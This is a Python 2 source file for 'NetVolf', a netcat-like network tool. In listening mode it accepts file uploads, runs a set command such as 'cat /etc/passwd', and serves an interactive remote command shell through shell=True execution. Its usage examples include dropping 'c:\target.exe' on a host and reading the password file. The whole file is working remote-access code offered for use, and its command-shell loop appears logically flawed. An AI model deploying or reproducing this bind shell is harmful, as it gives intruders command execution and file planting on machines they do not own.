#!/usr/bin/python
'''
 @author : "Muhammad Arslan <rslnrkmt2552@gmail.com>"
'''

import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "NetVolf Tool\n"
    print "Usage: netvolf.py -t target_host -p port"
    print "-l --listen                  = listen on [host] for incoming connections"
    print "-e --execute=file_to_run     = execute the given file upon recieving conn"
    print "-c --commandshell            =initialize a command shell"
    print "-u --upload=destination      = upon recieving a conn, upload to [destination]\n\n"

    print "Examples:"
    print "netvolf.py -t 192.168.0.1 -p 5555 -l -c"
    print "netvolf.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "netvolf.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./netvolf.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read() # send CTRL + D if not sending input to stdin, as it will block otherwise

        client_sender(buffer)

    if listen:
        server_loop()


def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
        while True:
            # wait for the response
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            if "EOF/ACK" in data:
                raise
            print response,

            #get input
            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)
    except:
        print "[*] Exception! Exiting."
        client.send("EOF")
        client.close()

def server_loop():
    global target
    clients = []

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((target, port))
    print "Server started. Listening for connections..."
    server.listen(5)

    while True:
        try:
            client_socket, addr = server.accept()

            client_thread = threading.Thread(target = client_handler, args=(client_socket,))
            clients.append(client_thread)
            client_thread.start()
        except (KeyboardInterrupt, SystemExit):
            for x in clients:
                x.join()
            sys.exit(0)


def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully saved file to %s.\r\n" % upload_destination)

        except:
            client_socket.send("Failed to save file to %s.\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)

        client_socket.send(output)

    if command:
        while True:
            client_socket.send("<NVolf:#>")
            cmd_buffer = ""
            while "\n" not in cmd_buffer or "EOF" not in cmd_buffer:
                data = client_socket.recv(1024)
                if len(data) < 1024:
                    client_socket.send("EOF/ACK")
                    return
                cmd_buffer += data
            if "EOF" in cmd_buffer:
                client_socket.send("EOF/ACK")
                return
            response = run_command(cmd_buffer)
            client_socket.send(response)


main()
